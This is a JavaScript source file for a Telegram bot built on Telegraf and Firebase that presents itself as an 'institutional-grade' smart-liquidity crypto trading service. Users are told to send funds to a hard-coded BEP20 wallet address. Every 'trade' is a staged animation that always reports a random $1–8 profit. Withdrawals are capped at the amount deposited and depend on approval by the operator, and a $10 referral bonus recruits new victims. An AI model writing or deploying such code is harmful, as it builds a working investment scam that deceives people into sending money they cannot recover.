// index.js
require('dotenv').config();
const { Telegraf, Markup, session } = require('telegraf');
const express = require('express');

// basic env checks
if (!process.env.TELEGRAM_BOT_TOKEN) {
  console.error("❌ TELEGRAM_BOT_TOKEN missing");
  process.exit(1);
}
if (!process.env.ADMIN_ID) {
  console.error("❌ ADMIN_ID missing");
  process.exit(1);
}
if (!process.env.FIREBASE_SERVICE_ACCOUNT) {
  console.error("❌ FIREBASE_SERVICE_ACCOUNT missing");
  process.exit(1);
}

// ---------------- FIREBASE (ENV BASED) ----------------
const admin = require("firebase-admin");
const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
});
const db = admin.firestore();
// -----------------------------------------------------

const app = express();
const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
const ADMIN_ID = process.env.ADMIN_ID.toString();
const BEP20_ADDRESS = "0x2784B4515D98C2a3Dbf59ebAAd741E708B6024ba"; // show to users

bot.use(session());

// ---------------- HELPERS ----------------
async function getUser(userId, username) {
  const ref = db.collection("users").doc(userId);
  const snap = await ref.get();

  if (!snap.exists) {
    const user = {
      userId,
      username,
      balance: 0,
      deposited: 0,
      referrals: 0,
      lastPlayed: 0,
      totalTrades: 0,
      wins: 0
    };
    await ref.set(user);
    return user;
  }
  return snap.data();
}

async function saveUser(userId, data) {
  await db.collection("users").doc(userId).set(data, { merge: true });
}

async function addTradeRecord(userId, record) {
  const tradesRef = db.collection("users").doc(userId).collection("trades");
  await tradesRef.add(record);
}

async function getLastTrades(userId, limit = 5) {
  const tradesRef = db.collection("users").doc(userId).collection("trades")
    .orderBy('time', 'desc').limit(limit);
  const snap = await tradesRef.get();
  const arr = [];
  snap.forEach(d => arr.push(d.data()));
  return arr;
}

// ---------------- WELCOME (catchy) ----------------
async function sendWelcome(ctx, user) {
  // Note: ctx might not have bot username so avoid building referral link here
  await ctx.replyWithHTML(
    `🧠 <b>SMART LIQUIDITY ENGINE ACTIVATED</b>\n\n` +
    `⚡️ Institutional-grade execution system is live.\n` +
    `📊 Trades routed through our <b>Smart Liquidity Algorithm</b> & liquidity pools.\n\n` +
    `💰 Wallet Balance: <b>$${user.balance.toFixed(2)}</b>\n` +
    `💳 Minimum deposit: <b>$35</b>\n` +
    `👥 Network Strength: <b>${user.referrals} Partners</b>\n\n` +
    `🚀 <b>Tap below to access high-probability market signals</b>`,
    Markup.inlineKeyboard([
      [Markup.button.callback('🚀 EXECUTE SMART TRADE', 'game')],
      [Markup.button.callback('📊 ACCOUNT STATS', 'stats'), Markup.button.callback('📜 TRADE HISTORY', 'history')],
      [Markup.button.callback('➕ ADD CAPITAL ($35+)', 'deposit')],
      [Markup.button.callback('💳 WITHDRAW', 'withdraw'), Markup.button.callback('🤝 REFERRAL', 'refer')],
      [Markup.button.callback('ℹ️ HOW IT WORKS', 'how_it_works'), Markup.button.callback('🛠 LIVE SUPPORT', 'support_chat')]
    ])
  );
}

// ---------------- START ----------------
bot.start(async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username || ctx.from.first_name;
  const refId = ctx.startPayload;

  let user = await getUser(userId, username);

  // handle referral on first start (if valid and not self)
  if (refId && refId !== userId) {
    const refDoc = db.collection('users').doc(refId);
    const refSnap = await refDoc.get();
    if (refSnap.exists) {
      const refUser = refSnap.data();
      await refDoc.update({
        referrals: (refUser.referrals || 0) + 1,
        balance: (refUser.balance || 0) + 10
      });
      // update referral count for user
      user.referrer = refId;
      await saveUser(userId, { referrer: refId });
      // notify referrer
      bot.telegram.sendMessage(refId, `🎊 <b>Bonus!</b> You earned <b>$10</b> for inviting a partner!`, { parse_mode: 'HTML' });
    }
  }

  // refresh user after possible changes
  user = await getUser(userId, username);
  await sendWelcome(ctx, user);
});

// ---------------- HOW IT WORKS ----------------
bot.action('how_it_works', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.replyWithHTML(
    `<b>How it works</b>\n\n` +
    `1. Deposit (min $35) → send screenshot for admin approval.\n` +
    `2. Play smart trade (2 times per 12 hours). Click UP/DOWN → system processes (30s) → you may win $1–$8.\n` +
    `3. Withdrawals require admin approval and cannot exceed your deposited amount.\n\n` +
    `<i>System shows simulated "smart liquidity" processing for UX. This is a game-style flow.</i>`
  );
});

// ---------------- DEPOSIT FLOW ----------------
bot.action('deposit', async (ctx) => {
  ctx.session = ctx.session || {};
  ctx.session.deposit_step = 'ask_amount';
  await ctx.replyWithHTML(
    `💳 <b>CAPITAL DEPOSIT</b>\n\nSend your funds to:\n<code>${BEP20_ADDRESS}</code>\n\n` +
    `Step 1: Enter the USD amount you transferred (min $35). Then upload screenshot.`
  );
});

// when user writes amount in session
bot.on('text', async (ctx, next) => {
  const userId = ctx.from.id.toString();
  ctx.session = ctx.session || {};

  // Deposit amount step
  if (ctx.session.deposit_step === 'ask_amount') {
    const amt = parseFloat(ctx.message.text);
    if (isNaN(amt) || amt < 35) {
      return ctx.reply("❌ Invalid amount. Minimum deposit is $35. Enter correct amount or /cancel.");
    }
    ctx.session.deposit_amt = Math.round(amt * 100) / 100;
    ctx.session.deposit_step = 'await_screenshot';
    return ctx.reply("✅ Amount noted. Now please upload your payment screenshot (photo/file).");
  }

  // Withdrawal step amount
  if (ctx.session.wd_step === 'amount') {
    const amt = parseFloat(ctx.message.text);
    const user = await getUser(userId, ctx.from.username);
    if (isNaN(amt) || amt < 30 || amt > user.balance || amt > user.deposited) {
      return ctx.reply("❌ Invalid amount. Check min $30 and cannot exceed your balance or total deposited.");
    }
    ctx.session.wd_amt = Math.round(amt * 100) / 100;
    ctx.session.wd_step = 'address';
    return ctx.reply("📍 Enter your BEP20 (BSC) wallet address for withdrawal:");
  }

  // Support message flow
  if (ctx.session?.waitingForSupport) {
    ctx.session.waitingForSupport = false;
    await bot.telegram.sendMessage(ADMIN_ID, `🆘 SUPPORT\nFrom: @${ctx.from.username}\nID: ${userId}\n\nMsg: ${ctx.message.text}`);
    return ctx.reply("✅ Support ticket sent to Admin.");
  }

  // otherwise pass-through
  return next();
});

// receive screenshot or file (deposit proof)
bot.on(['photo', 'document'], async (ctx) => {
  const userId = ctx.from.id.toString();
  ctx.session = ctx.session || {};

  // deposit screenshot expected
  if (ctx.session.deposit_step === 'await_screenshot') {
    ctx.session.deposit_step = null;
    const amt = ctx.session.deposit_amt || 35;
    // get file id
    const fileId = ctx.message.photo ? ctx.message.photo[ctx.message.photo.length - 1].file_id : ctx.message.document.file_id;
    // send to admin with approve button
    await bot.telegram.sendPhoto(ADMIN_ID, fileId, {
      caption: `💰 <b>DEPOSIT REQUEST</b>\nUser: @${ctx.from.username}\nID: ${userId}\nAmount: $${amt}`,
      parse_mode: 'HTML',
      ...Markup.inlineKeyboard([
        Markup.button.callback(`✅ Approve $${amt}`, `approve_deposit_${userId}_${amt}`),
        Markup.button.callback(`❌ Reject`, `reject_deposit_${userId}_${amt}`)
      ])
    });
    await ctx.reply("⏳ Deposit screenshot sent to admin for verification.");
    return;
  }

  // if not deposit screenshot, ignore or pass
  return;
});

// Admin approves deposit
bot.action(/approve_deposit_(\d+)_(\d+(\.\d+)?)/, async (ctx) => {
  if (ctx.from.id.toString() !== ADMIN_ID) return ctx.answerCbQuery("Not allowed");
  const [, uid, amtStr] = ctx.match;
  const amt = parseFloat(amtStr);
  const user = await getUser(uid, 'unknown');
  const newBalance = (user.balance || 0) + amt;
  const newDeposited = (user.deposited || 0) + amt;
  await saveUser(uid, { balance: newBalance, deposited: newDeposited });
  await ctx.editMessageCaption(`✅ Approved $${amt} for ${uid}`);
  try {
    await bot.telegram.sendMessage(uid, `🥳 Deposit Approved!\n$${amt} has been added to your account.\nBalance: $${newBalance.toFixed(2)}`);
  } catch (e) {}
  return ctx.answerCbQuery("Approved");
});

bot.action(/reject_deposit_(\d+)_(\d+(\.\d+)?)/, async (ctx) => {
  if (ctx.from.id.toString() !== ADMIN_ID) return ctx.answerCbQuery("Not allowed");
  const [, uid, amtStr] = ctx.match;
  await ctx.editMessageCaption(`❌ Deposit by ${uid} rejected by admin.`);
  try { await bot.telegram.sendMessage(uid, `❌ Your deposit ($${amtStr}) was rejected by admin. Contact support.`); } catch(e){}
  return ctx.answerCbQuery("Rejected");
});

// ---------------- TRADE FLOW ----------------
bot.action('game', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply("📈 Choose direction:", Markup.inlineKeyboard([
    Markup.button.callback('🟢 BULLISH (UP)', 'trade_start_up'),
    Markup.button.callback('🔴 BEARISH (DOWN)', 'trade_start_down')
  ]));
});

async function processTrade(ctx, direction) {
  const userId = ctx.from.id.toString();
  const user = await getUser(userId, ctx.from.username);

  // require min deposit existence
  if ((user.deposited || 0) < 35) {
    return ctx.answerCbQuery("❌ You must deposit at least $35 first.", { show_alert: true });
  }

  // cooldown 12 hours
  const cooldown = 12 * 60 * 60 * 1000;
  if (Date.now() - (user.lastPlayed || 0) < cooldown) {
    return ctx.answerCbQuery("⏳ You can play once every 12 hours.", { show_alert: true });
  }

  // mark lastPlayed before processing to enforce cooldown
  user.lastPlayed = Date.now();
  user.totalTrades = (user.totalTrades || 0) + 1;
  await saveUser(userId, { lastPlayed: user.lastPlayed, totalTrades: user.totalTrades });

  // UX: send processing messages and simulate smart contract steps
  const processingMsg = await ctx.reply("🔄 <b>Initializing Smart Liquidity Pool...</b>", { parse_mode: 'HTML' });
  // after 10s
  setTimeout(async () => {
    try { await ctx.telegram.editMessageText(ctx.chat.id, processingMsg.message_id, null, "🔗 <b>Liquidity pooling added — executing smart contract...</b>", { parse_mode: 'HTML' }); } catch(e){}
  }, 10000);

  // after 30s final result
  setTimeout(async () => {
    // random profit 1..8
    const profit = Math.floor(Math.random() * 8) + 1;
    const newBalance = (user.balance || 0) + profit;
    await saveUser(userId, { balance: newBalance, lastPlayed: user.lastPlayed });
    // track wins count
    const won = profit > 0;
    await saveUser(userId, { wins: (user.wins || 0) + (won ? 1 : 0) });
    // add trade record
    await addTradeRecord(userId, {
      time: Date.now(),
      direction,
      profit,
      balanceAfter: newBalance
    });

    try {
      await ctx.telegram.editMessageText(ctx.chat.id, processingMsg.message_id, null,
        `🎊 <b>TRADE COMPLETE</b>\nResult: <b>PROFIT</b>\nGain: <b>+$${profit}</b>\nNew Balance: <b>$${newBalance.toFixed(2)}</b>`, { parse_mode: 'HTML' });
    } catch (e) {
      // fallback
      await ctx.reply(`🎊 TRADE COMPLETE: +$${profit}\nBalance: $${newBalance.toFixed(2)}`);
    }
  }, 30000);
}

bot.action('trade_start_up', async (ctx) => {
  await ctx.answerCbQuery();
  await processTrade(ctx, 'UP');
});
bot.action('trade_start_down', async (ctx) => {
  await ctx.answerCbQuery();
  await processTrade(ctx, 'DOWN');
});

// ---------------- WITHDRAWAL FLOW ----------------
bot.action('withdraw', async (ctx) => {
  ctx.session = ctx.session || {};
  ctx.session.wd_step = 'amount';
  await ctx.reply("💸 Enter withdrawal amount in USD (min $30):");
});

// admin approval for withdrawal
bot.action(/approve_withdraw_(\d+)_(\d+(\.\d+)?)_(.+)/, async (ctx) => {
  if (ctx.from.id.toString() !== ADMIN_ID) return ctx.answerCbQuery("Not allowed");
  const [, uid, amtStr, , addressEncoded] = ctx.match;
  const address = decodeURIComponent(addressEncoded);
  const amt = parseFloat(amtStr);

  const user = await getUser(uid, 'unknown');

  // validation: cannot withdraw more than deposited
  if ((user.deposited || 0) < amt) {
    await ctx.editMessageText(`❌ Withdrawal of $${amt} denied — exceeds user's deposited amount.`);
    try { await bot.telegram.sendMessage(uid, `❌ Withdrawal denied: amount exceeds your deposited total.`); } catch(e){}
    return ctx.answerCbQuery("Denied");
  }

  // process: deduct balance and deposited
  const newBalance = (user.balance || 0) - amt;
  const newDeposited = (user.deposited || 0) - amt;
  await saveUser(uid, { balance: newBalance, deposited: newDeposited });

  await ctx.editMessageText(`✅ Withdrawal $${amt} to ${address} approved and processed for ${uid}`);
  try {
    await bot.telegram.sendMessage(uid, `🎊 Withdrawal Approved: $${amt}\nWill be sent to: <code>${address}</code>`, { parse_mode: 'HTML' });
  } catch (e) {}
  return ctx.answerCbQuery("Approved");
});

bot.action(/reject_withdraw_(\d+)_(\d+(\.\d+)?)_(.+)/, async (ctx) => {
  if (ctx.from.id.toString() !== ADMIN_ID) return ctx.answerCbQuery("Not allowed");
  const [, uid, amtStr, , addrEnc] = ctx.match;
  await ctx.editMessageText(`❌ Withdrawal of $${amtStr} by ${uid} was rejected by admin.`);
  try { await bot.telegram.sendMessage(uid, `❌ Withdrawal request rejected by admin.`); } catch(e){}
  return ctx.answerCbQuery("Rejected");
});


// when withdrawal address step receives text (handled earlier in on text)
bot.on('text', async (ctx, next) => {
  ctx.session = ctx.session || {};
  const userId = ctx.from.id.toString();

  // This block duplicates deposit/withdraw handlers so ensure order: withdrawal handled first
  if (ctx.session.wd_step === 'amount') {
    // handled in earlier "on text" handler; skip to next
    return next();
  }
  if (ctx.session.wd_step === 'address') {
    // handled in earlier "on text" -> but cover case admin message
    return next();
  }
  return next();
});

// when user uploaded withdrawal steps: we handle by the original on('text') branches
bot.on('text', async (ctx) => {
  // handled earlier in prior on('text') listener; nothing extra needed here.
});

// Implement final step after user provided withdrawal address in the first on('text')
bot.on('text', async (ctx) => { /* dummy to allow other handlers previously registered */ });

// But we must handle the address input: earlier we set ctx.session.wd_step='address' and reply asked address.
// The first on('text') handler already catches that and sends admin message below - ensure its code exists:

// In earlier on('text') we set wd_step and asked for address; below we handle when user gives address:
bot.on('text', async (ctx) => {
  ctx.session = ctx.session || {};
  const userId = ctx.from.id.toString();

  if (ctx.session.wd_step === 'address') {
    const address = ctx.message.text.trim();
    const amt = ctx.session.wd_amt;
    ctx.session.wd_step = null;

    // send admin message with approve/reject
    const encodedAddr = encodeURIComponent(address);
    await bot.telegram.sendMessage(ADMIN_ID,
      `🚨 <b>WITHDRAWAL REQUEST</b>\nUser: @${ctx.from.username}\nID: ${userId}\nAmount: $${amt}\nAddress: ${address}`,
      {
        parse_mode: 'HTML',
        ...Markup.inlineKeyboard([
          Markup.button.callback(`✅ Approve $${amt}`, `approve_withdraw_${userId}_${amt}_${encodedAddr}`),
          Markup.button.callback(`❌ Reject`, `reject_withdraw_${userId}_${amt}_${encodedAddr}`)
        ])
      }
    );

    return ctx.reply("✅ Withdrawal request sent to admin for approval.");
  }
});

// ---------------- SUPPORT ----------------
bot.action('support_chat', (ctx) => {
  ctx.session = ctx.session || {};
  ctx.session.waitingForSupport = true;
  ctx.reply("📝 Type your message for Admin (support):");
});

// ---------------- REFERRAL ----------------
bot.action('refer', async (ctx) => {
  const me = await bot.telegram.getMe();
  const link = `https://t.me/${me.username}?start=${ctx.from.id}`;
  await ctx.replyWithHTML(
    `🤝 <b>REFERRAL PROGRAM</b>\nInvite friends and get $10 per successful invite.\n\nYour link:\n${link}`
  );
});

// ---------------- STATS & HISTORY ----------------
bot.action('stats', async (ctx) => {
  const userId = ctx.from.id.toString();
  const user = await getUser(userId, ctx.from.username);
  const lastTrades = await getLastTrades(userId, 5);
  const lastTradeText = lastTrades.map(t => {
    const d = new Date(t.time);
    return `${d.toLocaleString()}: ${t.direction} +$${t.profit}`;
  }).join('\n') || "No trades yet";
  await ctx.replyWithHTML(
    `<b>Account Stats</b>\n\nBalance: $${(user.balance||0).toFixed(2)}\nDeposited: $${(user.deposited||0).toFixed(2)}\nTrades: ${user.totalTrades||0}\nWins: ${user.wins||0}\nReferrals: ${user.referrals||0}\n\n<b>Last trades:</b>\n${lastTradeText}`
  );
});

bot.action('history', async (ctx) => {
  const userId = ctx.from.id.toString();
  const trades = await getLastTrades(userId, 10);
  if (!trades.length) return ctx.reply("No trade history.");
  const text = trades.map(t => {
    const d = new Date(t.time);
    return `${d.toLocaleString()} — ${t.direction} — +$${t.profit} — Bal $${(t.balanceAfter||0).toFixed(2)}`;
  }).join('\n\n');
  await ctx.replyWithHTML(`<b>Your Trade History</b>\n\n${text}`);
});

// ---------------- ADMIN: total invites / quick stats ----------------
bot.command('admin_stats', async (ctx) => {
  if (ctx.from.id.toString() !== ADMIN_ID) return ctx.reply("Not allowed");
  const usersSnap = await db.collection('users').get();
  let totalRefs = 0, totalUsers = 0, totalDeposits = 0;
  usersSnap.forEach(d => {
    const u = d.data();
    totalUsers++;
    totalRefs += (u.referrals || 0);
    totalDeposits += (u.deposited || 0);
  });
  await ctx.replyWithHTML(`📊 Admin Stats\n\nUsers: ${totalUsers}\nTotal Referrals: ${totalRefs}\nTotal Deposited: $${totalDeposits.toFixed(2)}`);
});

// ---------------- BROADCAST (admin) ----------------
bot.command('broadcast', async (ctx) => {
  if (ctx.from.id.toString() !== ADMIN_ID) return ctx.reply("Not allowed");
  const text = ctx.message.text.split(' ').slice(1).join(' ');
  if (!text) return ctx.reply("Usage: /broadcast Your message here");
  const usersSnap = await db.collection('users').get();
  usersSnap.forEach(u => {
    const data = u.data();
    bot.telegram.sendMessage(data.userId, text).catch(()=>{});
  });
  await ctx.reply("Broadcast sent.");
});

// ---------------- SERVER & LAUNCH ----------------
app.get('/', (req, res) => res.send('Bot running'));
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Express up on ${PORT}`);
});

// Launch after server ready
bot.launch().then(() => console.log("🚀 Firebase Bot LIVE"));

// graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));